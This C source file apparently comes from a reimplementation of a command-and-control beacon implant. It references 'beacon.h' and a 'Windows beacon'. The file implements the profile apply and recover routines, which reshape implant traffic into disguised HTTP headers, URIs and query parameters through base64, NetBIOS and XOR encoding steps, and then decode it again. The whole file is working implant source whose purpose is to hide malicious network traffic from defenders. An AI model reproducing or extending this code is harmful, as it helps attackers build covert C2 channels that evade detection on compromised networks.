#include "profile.h"
#include "encoders.h"
#include "parse.h"
#include "beacon.h"
#include "debug.h"
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

/* Official profile.cpp apply/recover.
 * Program stream: big-endian ints via data_int; string ops are len:u32 + bytes.
 * data_init(..., 1024) matches Windows beacon program window. */

#define STATIC_ALLOC_SIZE 8192
#define PROF_ARG 1024

void profile_setup(profile_t *prof, int size) {
    int max;

    memset(prof, 0, sizeof(*prof));
    max = size * 3;
    if (max < STATIC_ALLOC_SIZE)
        max = STATIC_ALLOC_SIZE;
    prof->max = max;

    prof->headers    = (char *)calloc(1, PROF_ARG);
    prof->parameters = (char *)calloc(1, PROF_ARG);
    prof->uri        = (char *)calloc(1, PROF_ARG);
    prof->buffer     = (char *)calloc(1, (size_t)max);
    prof->temp       = (char *)calloc(1, (size_t)max);
    prof->stage      = (char *)calloc(1, (size_t)max);
    prof->blen = 0;

    if (!prof->headers || !prof->parameters || !prof->uri ||
        !prof->buffer || !prof->temp || !prof->stage) {
        profile_free(prof);
    }
}

void profile_free(profile_t *prof) {
    if (!prof) return;
    free(prof->headers);
    free(prof->parameters);
    free(prof->uri);
    free(prof->buffer);
    free(prof->temp);
    free(prof->stage);
    memset(prof, 0, sizeof(*prof));
}

void apply(char *program, int program_len, profile_t *myprofile,
           char *arg1, int len1, char *arg2, int len2) {
    int x = 0;
    int sz = 0;
    char arg[PROF_ARG];
    int next = 0;
    int status = 0;
    int length = 0;
    datap parser;
    char *hosth = NULL;
    int hostset = 0;
    unsigned long enc_len;
    size_t al;
    int plen;

    if (!myprofile || !myprofile->temp || !myprofile->stage)
        return;
    if (!program || program_len <= 0)
        return;

    /* Official uses 1024 window inside the settings patch; our PTR fields are
     * separately malloc'd to fixed size — never read past program_len. */
    plen = program_len;
    if (plen > 1024) plen = 1024;

    hosth = setting_ptr(SETTING_HOST_HEADER);
    data_init(&parser, program, plen);

    while (1) {
        next = (int)data_int(&parser);
        switch (next) {
        case IN_APPEND:
            memset(arg, 0, sizeof(arg));
            sz = data_string(&parser, arg, PROF_ARG);
            if (sz <= 0) break;
            al = strlen(arg);
            if (length + (int)al > myprofile->max) return;
            memcpy(myprofile->temp + length, arg, al);
            length += (int)al;
            break;

        case IN_PREPEND:
            memset(arg, 0, sizeof(arg));
            sz = data_string(&parser, arg, PROF_ARG);
            if (sz <= 0) break;
            al = strlen(arg);
            if ((int)al + length > myprofile->max) return;
            memcpy(myprofile->stage, arg, al);
            memcpy(myprofile->stage + al, myprofile->temp, (size_t)length);
            length += (int)al;
            memset(myprofile->temp, 0, (size_t)myprofile->max);
            memcpy(myprofile->temp, myprofile->stage, (size_t)length);
            break;

        case IN_BASE64:
            sz = length;
            enc_len = (unsigned long)myprofile->max;
            status = b64_encode_buf((const unsigned char *)myprofile->temp,
                                    (unsigned long)sz,
                                    (unsigned char *)myprofile->stage,
                                    &enc_len);
            if (status != 0)
                return;
            length = (int)enc_len;
            memset(myprofile->temp, 0, (size_t)myprofile->max);
            memcpy(myprofile->temp, myprofile->stage, (size_t)length);
            if (length < myprofile->max) myprofile->temp[length] = 0;
            break;

        case IN_BASE64URL:
            sz = length;
            enc_len = (unsigned long)myprofile->max;
            status = base64url_encode((const unsigned char *)myprofile->temp,
                                      (unsigned long)sz,
                                      (unsigned char *)myprofile->stage,
                                      &enc_len);
            if (status != 0)
                return;
            length = (int)enc_len;
            memset(myprofile->temp, 0, (size_t)myprofile->max);
            memcpy(myprofile->temp, myprofile->stage, (size_t)length);
            if (length < myprofile->max) myprofile->temp[length] = 0;
            break;

        case IN_PRINT:
            if (length > myprofile->max) length = myprofile->max;
            memcpy(myprofile->buffer, myprofile->temp, (size_t)length);
            myprofile->blen = length;
            break;

        case IN_PARAMETER:
            memset(arg, 0, sizeof(arg));
            data_string(&parser, arg, PROF_ARG);
            /* terminal: stuff temp into query string */
            if (myprofile->parameters[0] == 0)
                snprintf(myprofile->stage, PROF_ARG, "?%s=%s", arg, myprofile->temp);
            else
                snprintf(myprofile->stage, PROF_ARG, "%s&%s=%s",
                         myprofile->parameters, arg, myprofile->temp);
            memcpy(myprofile->parameters, myprofile->stage, PROF_ARG);
            break;

        case IN_HEADER:
            memset(arg, 0, sizeof(arg));
            data_string(&parser, arg, PROF_ARG);
            snprintf(myprofile->stage, PROF_ARG, "%s%s: %s\r\n",
                     myprofile->headers, arg, myprofile->temp);
            memcpy(myprofile->headers, myprofile->stage, PROF_ARG);
            break;

        case IN_BUILD:
            x = (int)data_int(&parser);
            memset(myprofile->temp, 0, (size_t)myprofile->max);
            if (x == 0) {
                if (arg1 && len1 > 0 && len1 <= myprofile->max) {
                    memcpy(myprofile->temp, arg1, (size_t)len1);
                    length = len1;
                } else {
                    length = 0;
                }
            } else if (x == 1) {
                if (arg2 && len2 > 0 && len2 <= myprofile->max) {
                    memcpy(myprofile->temp, arg2, (size_t)len2);
                    length = len2;
                } else {
                    length = 0;
                }
            }
            break;

        case IN_NETBIOS:
            sz = netbios_encode('a', myprofile->temp, length,
                                myprofile->stage, myprofile->max);
            length = sz;
            memset(myprofile->temp, 0, (size_t)myprofile->max);
            memcpy(myprofile->temp, myprofile->stage, (size_t)length);
            if (length < myprofile->max) myprofile->temp[length] = 0;
            break;

        case IN_ADD_PARAMETER:
            memset(arg, 0, sizeof(arg));
            data_string(&parser, arg, PROF_ARG);
            if (myprofile->parameters[0] == 0)
                snprintf(myprofile->stage, PROF_ARG, "?%s", arg);
            else
                snprintf(myprofile->stage, PROF_ARG, "%s&%s",
                         myprofile->parameters, arg);
            memcpy(myprofile->parameters, myprofile->stage, PROF_ARG);
            break;

        case IN_ADD_HEADER:
            memset(arg, 0, sizeof(arg));
            data_string(&parser, arg, PROF_ARG);
            snprintf(myprofile->stage, PROF_ARG, "%s%s\r\n",
                     myprofile->headers, arg);
            memcpy(myprofile->headers, myprofile->stage, PROF_ARG);
            break;

        case IN_ADD_HEADER_HOST:
            memset(arg, 0, sizeof(arg));
            data_string(&parser, arg, PROF_ARG);
            if (hosth != NULL && hosth[0] != '\0') {
                snprintf(myprofile->stage, PROF_ARG, "%s%s\r\n",
                         myprofile->headers, hosth);
                hostset = 1;
            } else {
                snprintf(myprofile->stage, PROF_ARG, "%s%s\r\n",
                         myprofile->headers, arg);
            }
            memcpy(myprofile->headers, myprofile->stage, PROF_ARG);
            break;

        case IN_NETBIOSU:
            sz = netbios_encode('A', myprofile->temp, length,
                                myprofile->stage, myprofile->max);
            length = sz;
            memset(myprofile->temp, 0, (size_t)myprofile->max);
            memcpy(myprofile->temp, myprofile->stage, (size_t)length);
            if (length < myprofile->max) myprofile->temp[length] = 0;
            break;

        case IN_MASK:
            sz = xor_encode(myprofile->temp, length,
                            myprofile->stage, myprofile->max);
            if (sz == 0) return;
            length = sz;
            memset(myprofile->temp, 0, (size_t)myprofile->max);
            memcpy(myprofile->temp, myprofile->stage, (size_t)length);
            /* mask output is binary; only string terminals need NUL — leave length exact */
            break;

        case IN_URI_APPEND:
            snprintf(myprofile->stage, PROF_ARG, "%s%s",
                     myprofile->uri, myprofile->temp);
            memcpy(myprofile->uri, myprofile->stage, PROF_ARG);
            break;

        case 0x0:
            /* Inject global Host header if profile never set one */
            if (!hostset && hosth != NULL && hosth[0] != '\0') {
                snprintf(myprofile->stage, PROF_ARG, "%s%s\r\n",
                         myprofile->headers, hosth);
                memcpy(myprofile->headers, myprofile->stage, PROF_ARG);
            }
            return;

        default:
            DEBUG_PRINT("[profile] apply unknown op %d\n", next);
            return;
        }
    }
}

int recover(char *program, int program_len, char *buffer, int read, int max) {
    int sz = 0;
    unsigned long tlen;
    int status = 0;
    char *temp = NULL;
    int next = 0;
    datap parser;
    int plen;

    if (!buffer || read < 0)
        return 0;

    /* Missing or empty recover program → identity */
    if (!program || program_len <= 0)
        return read;
    plen = program_len;
    if (plen > 1024) plen = 1024;
    {
        datap peek;
        data_init(&peek, program, plen >= 4 ? 4 : plen);
        if (plen < 4 || data_int(&peek) == 0)
            return read;
    }

    temp = (char *)malloc((size_t)read + 64);
    if (!temp)
        return 0;

    data_init(&parser, program, plen);

    while (1) {
        next = (int)data_int(&parser);
        switch (next) {
        case IN_APPEND:
            /* strip right [sz] bytes */
            sz = (int)data_int(&parser);
            read -= sz;
            if (read < 0)
                goto cleanup;
            break;

        case IN_PREPEND:
            sz = (int)data_int(&parser);
            if (sz > read)
                goto cleanup;
            memcpy(temp, buffer, (size_t)read);
            memcpy(buffer, temp + sz, (size_t)(read - sz));
            read -= sz;
            break;

        case IN_BASE64:
            buffer[read] = '\0';
            tlen = (unsigned long)max;
            status = b64_decode_buf((const unsigned char *)buffer,
                                    (unsigned long)read,
                                    (unsigned char *)temp, &tlen);
            if (status != 0)
                goto cleanup;
            read = (int)tlen;
            if (read > max) goto cleanup;
            memcpy(buffer, temp, (size_t)read);
            break;

        case IN_BASE64URL: {
            char *work;
            buffer[read] = '\0';
            tlen = (unsigned long)max;
            work = (char *)malloc((size_t)read + 8);
            if (!work) goto cleanup;
            memcpy(work, buffer, (size_t)read);
            work[read] = 0;
            status = base64url_decode((unsigned char *)work,
                                      (unsigned long)read,
                                      (unsigned long)read + 8,
                                      (unsigned char *)temp, &tlen);
            free(work);
            if (status != 0)
                goto cleanup;
            read = (int)tlen;
            if (read > max) goto cleanup;
            memcpy(buffer, temp, (size_t)read);
            break;
        }

        case IN_PRINT:
        case IN_PARAMETER:
        case IN_HEADER:
        case IN_URI_APPEND:
            break;

        case IN_NETBIOS:
            buffer[read] = '\0';
            tlen = (unsigned long)max;
            read = netbios_decode('a', buffer, read, temp, (int)tlen);
            if (read == 0)
                goto cleanup;
            memcpy(buffer, temp, (size_t)read);
            buffer[read] = '\0';
            break;

        case IN_NETBIOSU:
            buffer[read] = '\0';
            tlen = (unsigned long)max;
            read = netbios_decode('A', buffer, read, temp, (int)tlen);
            if (read == 0)
                goto cleanup;
            memcpy(buffer, temp, (size_t)read);
            buffer[read] = '\0';
            break;

        case IN_MASK:
            buffer[read] = '\0';
            tlen = (unsigned long)max;
            read = xor_decode(buffer, read, temp, (int)tlen);
            if (read == 0)
                goto cleanup;
            memcpy(buffer, temp, (size_t)read);
            buffer[read] = '\0';
            break;

        case 0x0:
            free(temp);
            return read;

        default:
            DEBUG_PRINT("[profile] recover unknown op %d\n", next);
            goto cleanup;
        }
    }

cleanup:
    free(temp);
    return 0;
}
